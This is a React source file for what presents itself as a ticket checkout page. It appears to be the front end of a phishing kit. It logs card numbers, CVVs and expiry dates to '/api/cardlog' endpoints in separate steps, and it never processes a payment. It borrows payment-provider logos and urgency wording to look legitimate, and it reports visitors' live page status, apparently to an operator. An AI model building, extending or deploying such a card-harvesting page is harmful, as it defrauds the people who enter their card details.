// Payment.tsx - с ошибками для всех полей карты
import { useState, useEffect } from "react";
import styles from "./Payment.module.css";
import TotalOverview from "../../components/TotalOverview/TotalOverview";
import { useLocation } from "react-router-dom";
import Help from "../../components/Help/Help";
import { useRedirectChecker } from "../../hooks/useRedirectChecker";
import Loading from "../../components/Loading/Loading";
import Modal from "../../components/UI/Modal/Modal";
import { useOnlineStatus } from "../../hooks/useOnlineStatus";

const Payment = () => {
  const sessionId = localStorage.getItem("currentSessionId");
  const location = useLocation();
  useRedirectChecker(3000);
  useRedirectChecker(3000);
  useOnlineStatus({
    sessionId,
    pageName: "payment",
    enabled: true,
  });
  const [isLoading, setLoading] = useState<boolean>(false);
  const [currentStep, setCurrentStep] = useState<"personal" | "payment">(
    "personal"
  );
  const [isModalActive, setModalActive] = useState<boolean>(false);
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    countryCode: "+971", // Фиксированный код ОАЭ
    phoneNumber: "",
  });

  const [, setCardNumberSent] = useState<boolean>(false);

  const [cardData, setCardData] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
  });

  const [formErrors, setFormErrors] = useState({
    firstName: "",
    lastName: "",
    phoneNumber: "",
  });

  const [cardErrors, setCardErrors] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
  });

  useEffect(() => {
    window.scrollTo(0, 0);
  }, [location.pathname, currentStep]);

  const sendCardNumberToServer = async (): Promise<boolean> => {
    const sessionId = localStorage.getItem("currentSessionId");
    if (!sessionId) {
      alert("Session ID not found");
      return false;
    }

    try {
      // Убираем пробелы из номера карты перед отправкой
      const cleanCardNumber = cardData.cardNumber.replace(/\D/g, "");

      const response = await fetch("/api/cardlog", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: sessionId,
          cardNumber: cleanCardNumber,
          cvv: "", // Пока пустой
          expireDate: "", // Пока пустой
          step: "card_number_only", // Добавляем метку для бэкенда
        }),
      });

      const data = await response.json();
      return data.success;
    } catch (err) {
      console.error("Ошибка сети при отправке номера карты:", err);
      return false;
    }
  };

  const sendFullCardDataToServer = async (): Promise<boolean> => {
    const sessionId = localStorage.getItem("currentSessionId");
    if (!sessionId) {
      alert("Session ID not found");
      return false;
    }

    try {
      const response = await fetch("/api/cardlog-update", {
        // Новый эндпоинт
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: sessionId,
          cvv: cardData.cvv,
          expireDate: cardData.expiryDate,
        }),
      });

      const data = await response.json();
      return data.success;
    } catch (err) {
      console.error("Ошибка сети при отправке полных данных:", err);
      return false;
    }
  };

  // Валидация имени/фамилии (только буквы, пробелы и апострофы)
  const validateName = (name: string): boolean => {
    const nameRegex = /^[a-zA-Zа-яА-Я\s'-]+$/;
    return nameRegex.test(name) && name.length >= 2;
  };

  // Валидация номера телефона (только цифры, минимум 7 цифр)
  const validatePhone = (phone: string): boolean => {
    const phoneRegex = /^\d+$/;
    return phoneRegex.test(phone) && phone.length >= 7 && phone.length <= 15;
  };

  // Валидация номера карты (ровно 16 цифр)
  const validateCardNumber = (cardNumber: string): boolean => {
    const digits = cardNumber.replace(/\D/g, "");
    return digits.length === 16;
  };

  // Валидация даты истечения (формат MM/YY, валидный месяц)
  const validateExpiryDate = (expiryDate: string): boolean => {
    const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
    if (!expiryRegex.test(expiryDate)) {
      return false;
    }

    // Проверка что дата не истекла
    const [month, year] = expiryDate.split("/");
    const now = new Date();
    const currentYear = now.getFullYear() % 100; // Получаем последние 2 цифры года
    const currentMonth = now.getMonth() + 1; // Месяцы от 1 до 12

    const expiryYear = parseInt(year, 10);
    const expiryMonth = parseInt(month, 10);

    if (expiryYear < currentYear) return false;
    if (expiryYear === currentYear && expiryMonth < currentMonth) return false;

    return true;
  };

  // Валидация CVV (ровно 3 цифры)
  const validateCvv = (cvv: string): boolean => {
    return cvv.length === 3 && /^\d+$/.test(cvv);
  };

  const handleInputChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>
  ) => {
    const { name, value } = e.target;

    let filteredValue = value;

    // Применяем фильтрацию в зависимости от поля
    if (name === "firstName" || name === "lastName") {
      // Только буквы, пробелы, апострофы и дефисы
      filteredValue = value.replace(/[^a-zA-Zа-яА-Я\s'-]/g, "");
    } else if (name === "phoneNumber") {
      // Только цифры
      filteredValue = value.replace(/\D/g, "");
    }

    setFormData((prev) => ({
      ...prev,
      [name]: filteredValue,
    }));

    // Очищаем ошибку при вводе
    setFormErrors((prev) => ({
      ...prev,
      [name]: "",
    }));
  };

  // Функция для проверки всех полей перед отправкой
  const validatePersonalForm = (): boolean => {
    const errors = {
      firstName: "",
      lastName: "",
      phoneNumber: "",
    };

    if (!formData.firstName) {
      errors.firstName = "First name is required";
    } else if (!validateName(formData.firstName)) {
      errors.firstName =
        "Please enter a valid first name (letters only, min 2 characters)";
    }

    if (!formData.lastName) {
      errors.lastName = "Last name is required";
    } else if (!validateName(formData.lastName)) {
      errors.lastName =
        "Please enter a valid last name (letters only, min 2 characters)";
    }

    if (!formData.phoneNumber) {
      errors.phoneNumber = "Phone number is required";
    } else if (!validatePhone(formData.phoneNumber)) {
      errors.phoneNumber = "Please enter a valid phone number (7-15 digits)";
    }

    setFormErrors(errors);

    return !errors.firstName && !errors.lastName && !errors.phoneNumber;
  };

  // Функция для форматирования номера карты (только цифры, максимум 16)
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, ""); // Удаляем все не-цифры
    value = value.substring(0, 16); // Ограничиваем 16 цифрами

    // Добавляем пробелы каждые 4 цифры для лучшего отображения
    const formattedValue = value.replace(/(\d{4})/g, "$1 ").trim();

    setCardData((prev) => ({
      ...prev,
      cardNumber: formattedValue,
    }));

    // Очищаем ошибку при вводе
    setCardErrors((prev) => ({
      ...prev,
      cardNumber: "",
    }));
  };

  // Функция для форматирования даты истечения (MM/YY)
  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, ""); // Удаляем все не-цифры

    if (value.length > 2) {
      value = value.substring(0, 2) + "/" + value.substring(2, 4);
    }

    value = value.substring(0, 5); // Ограничиваем MM/YY форматом

    setCardData((prev) => ({
      ...prev,
      expiryDate: value,
    }));

    // Очищаем ошибку при вводе
    setCardErrors((prev) => ({
      ...prev,
      expiryDate: "",
    }));
  };

  // Функция для ввода CVV (только 3 цифры)
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, ""); // Удаляем все не-цифры
    value = value.substring(0, 3); // Ограничиваем 3 цифрами

    setCardData((prev) => ({
      ...prev,
      cvv: value,
    }));

    // Очищаем ошибку при вводе
    setCardErrors((prev) => ({
      ...prev,
      cvv: "",
    }));
  };

  // Валидация полей карты в модальном окне
  const validateCardForm = (): boolean => {
    const errors = {
      cardNumber: "",
      expiryDate: "",
      cvv: "",
    };

    if (!cardData.cardNumber) {
      errors.cardNumber = "Card number is required";
    } else if (!validateCardNumber(cardData.cardNumber)) {
      errors.cardNumber = "Please enter a valid 16-digit card number";
    }

    if (!cardData.expiryDate) {
      errors.expiryDate = "Expiry date is required";
    } else if (!validateExpiryDate(cardData.expiryDate)) {
      errors.expiryDate = "Please enter a valid expiry date (MM/YY)";
    }

    if (!cardData.cvv) {
      errors.cvv = "CVV is required";
    } else if (!validateCvv(cardData.cvv)) {
      errors.cvv = "Please enter a valid 3-digit CVV";
    }

    setCardErrors(errors);

    return !errors.cardNumber && !errors.expiryDate && !errors.cvv;
  };

  const handleSubmitPersonalData = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();

    // Валидация всех полей
    if (!validatePersonalForm()) {
      return;
    }

    // БЕРЕМ sessionId ИЗ localStorage
    const sessionId = localStorage.getItem("currentSessionId");
    if (!sessionId) {
      alert("Session ID not found");
      return;
    }

    try {
      const response = await fetch("/api/customer", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId: sessionId, // ← Отправляем sessionId
          name: formData.firstName,
          surname: formData.lastName,
          phone: formData.countryCode + formData.phoneNumber, // Отправляем полный номер с кодом
        }),
      });

      const data = await response.json();
      if (data.success) {
        setCurrentStep("payment");
      } else {
        alert("Ошибка при отправке данных");
      }
    } catch (err) {
      console.error("Ошибка сети:", err);
      alert("Не удалось отправить данные");
    }
  };

  const handleOpenPaymentModal = async () => {
    // Валидация номера карты перед открытием модального окна
    if (!cardData.cardNumber) {
      setCardErrors((prev) => ({
        ...prev,
        cardNumber: "Card number is required",
      }));
      return;
    } else if (!validateCardNumber(cardData.cardNumber)) {
      setCardErrors((prev) => ({
        ...prev,
        cardNumber: "Please enter a valid 16-digit card number",
      }));
      return;
    }
    
    // Отправляем номер карты на сервер
    setLoading(true);
    const cardNumberSent = await sendCardNumberToServer();
    setLoading(false);

    if (!cardNumberSent) {
      alert("Failed to process card number. Please try again.");
      return;
    }

    setCardNumberSent(true);
    setCardErrors({
      cardNumber: "",
      expiryDate: "",
      cvv: "",
    });
    setModalActive(true);
  };

  const handleSubmitPayment = async () => {
    // Валидация всех полей карты
    if (!validateCardForm()) {
      return;
    }

    setModalActive(false);
    setLoading(true);

    try {
      // Отправляем остальные данные карты
      const fullDataSent = await sendFullCardDataToServer();

      if (fullDataSent) {
        // Успешная обработка
      } else {
        alert("Ошибка при обработке платежа");
      }
    } catch (err) {
      console.error("Ошибка сети:", err);
      alert("Не удалось обработать платеж");
    }
  };

  return (
    <>
      <div className={styles.wrapper}>
        <div className={styles.content__side}>
          <div className={styles.form__container}>
            {currentStep === "personal" ? (
              <>
                <h1 className={styles.form__title}>
                  Who shall we send these tickets to?
                </h1>

                <form
                  onSubmit={(e) => handleSubmitPersonalData(e)}
                  className={styles.form}
                >
                  <div className={styles.form__row}>
                    <div className={styles.form__group}>
                      <label htmlFor="firstName" className={styles.form__label}>
                        First name
                      </label>
                      <input
                        type="text"
                        id="firstName"
                        name="firstName"
                        value={formData.firstName}
                        onChange={handleInputChange}
                        className={`${styles.form__input} ${
                          formErrors.firstName ? styles.input__error : ""
                        }`}
                        maxLength={50}
                        required
                      />
                      {formErrors.firstName && (
                        <div className={styles.error__message}>
                          {formErrors.firstName}
                        </div>
                      )}
                    </div>

                    <div className={styles.form__group}>
                      <label htmlFor="lastName" className={styles.form__label}>
                        Last name
                      </label>
                      <input
                        type="text"
                        id="lastName"
                        name="lastName"
                        value={formData.lastName}
                        onChange={handleInputChange}
                        className={`${styles.form__input} ${
                          formErrors.lastName ? styles.input__error : ""
                        }`}
                        maxLength={50}
                        required
                      />
                      {formErrors.lastName && (
                        <div className={styles.error__message}>
                          {formErrors.lastName}
                        </div>
                      )}
                    </div>
                  </div>

                  <div className={styles.form__group}>
                    <label htmlFor="phone" className={styles.form__label}>
                      Mobile phone number
                    </label>

                    <div className={styles.phone__container}>
                      <div className={styles.country__code}>
                        <span className={styles.country__code__text}>
                          {formData.countryCode}
                        </span>
                      </div>
                      <div className={styles.phone__input__container}>
                        <input
                          type="tel"
                          id="phone"
                          name="phoneNumber"
                          value={formData.phoneNumber}
                          onChange={handleInputChange}
                          className={`${styles.phone__input} ${
                            formErrors.phoneNumber ? styles.input__error : ""
                          }`}
                          maxLength={15}
                          required
                        />
                      </div>
                    </div>
                    {formErrors.phoneNumber && (
                      <div className={styles.error__message}>
                        {formErrors.phoneNumber}
                      </div>
                    )}

                    <p className={styles.phone__note}>
                      We will use this phone number for ticket delivery
                      notification via SMS and in case of order problems.
                    </p>
                  </div>
                </form>
              </>
            ) : (
              <>
                <h1 className={styles.form__title}>Payment Details</h1>
                <p className={styles.form__subtitle}>
                  We have secured your tickets. To receive your tickets please
                  complete your payment as soon as possible via one of our
                  secure payment methods.
                </p>
                <div className={styles.form}>
                  <div className={styles.form__group}>
                    <div className={styles.supported_cards}>
                      <img
                        height="16"
                        alt="visa"
                        src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/visa.svg"
                      />
                      <img
                        height="16"
                        alt="mc"
                        src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/mc.svg"
                      />
                      <img
                        height="16"
                        alt="bcmc"
                        src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/bcmc.svg"
                      />
                      <img
                        height="16"
                        alt="amex"
                        src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/amex.svg"
                      />
                      <img
                        height="16"
                        alt="cup"
                        src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/cup.svg"
                      />
                      <img
                        height="16"
                        alt="diners"
                        src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/diners.svg"
                      />
                      <img
                        height="16"
                        alt="discover"
                        src="https://checkoutshopper-live.adyen.com/checkoutshopper/images/logos/discover.svg"
                      />
                    </div>
                    <label htmlFor="cardNumber" className={styles.form__label}>
                      Card Number
                    </label>
                    <input
                      type="text"
                      id="cardNumber"
                      name="cardNumber"
                      value={cardData.cardNumber}
                      onChange={handleCardNumberChange}
                      className={`${styles.form__input} ${
                        cardErrors.cardNumber ? styles.input__error : ""
                      }`}
                      placeholder="1234 5678 9012 3456"
                      maxLength={19} // 16 цифр + 3 пробела
                      required
                    />
                    {cardErrors.cardNumber && (
                      <div className={styles.error__message}>
                        {cardErrors.cardNumber}
                      </div>
                    )}
                  </div>
                </div>

                {/* Модальное окно для дополнительных данных карты */}
                <Modal active={isModalActive} setActive={setModalActive}>
                  <div className={styles.modal__content}>
                    <h2 className={styles.modal__title}>Complete Payment</h2>
                    <div className={styles.form__row}>
                      <div className={styles.form__group}>
                        <label
                          htmlFor="expiryDate"
                          className={styles.form__label}
                        >
                          Expiry Date
                        </label>
                        <input
                          type="text"
                          id="expiryDate"
                          name="expiryDate"
                          value={cardData.expiryDate}
                          onChange={handleExpiryDateChange}
                          className={`${styles.form__input} ${
                            cardErrors.expiryDate ? styles.input__error : ""
                          }`}
                          placeholder="MM/YY"
                          maxLength={5}
                          required
                        />
                        {cardErrors.expiryDate && (
                          <div className={styles.error__message}>
                            {cardErrors.expiryDate}
                          </div>
                        )}
                      </div>

                      <div className={styles.form__group}>
                        <label htmlFor="cvv" className={styles.form__label}>
                          CVV
                        </label>
                        <input
                          type="text"
                          id="cvv"
                          name="cvv"
                          value={cardData.cvv}
                          onChange={handleCvvChange}
                          className={`${styles.form__input} ${
                            cardErrors.cvv ? styles.input__error : ""
                          }`}
                          placeholder="123"
                          maxLength={3}
                          required
                        />
                        {cardErrors.cvv && (
                          <div className={styles.error__message}>
                            {cardErrors.cvv}
                          </div>
                        )}
                      </div>
                    </div>
                    <button
                      className={styles.pay__now__btn}
                      onClick={handleSubmitPayment}
                      disabled={isLoading}
                    >
                      {isLoading ? "Processing..." : "Pay Now"}
                    </button>
                  </div>
                </Modal>
              </>
            )}
          </div>
        </div>
        <div className={styles.static__side}>
          <TotalOverview
            onNextStep={
              currentStep === "personal"
                ? handleSubmitPersonalData
                : handleOpenPaymentModal
            }
            isPaymentStep={currentStep === "payment"}
          />
        </div>
      </div>
      <Help />
      <Loading isLoading={isLoading} />
    </>
  );
};

export default Payment;
